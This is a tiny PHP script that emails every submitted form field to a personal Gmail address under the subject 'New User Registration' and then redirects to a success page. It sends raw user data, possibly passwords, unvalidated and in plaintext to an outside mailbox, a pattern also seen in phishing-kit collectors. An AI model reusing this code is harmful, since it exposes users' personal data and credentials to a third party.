<?php
  $message = '';
  foreach($_POST as $key => $value) {
    $message .= "$key => $value\n";
  }
  mail('margobra8@gmail.com','New User Registration',$message);
  header('Location: success.html');
?>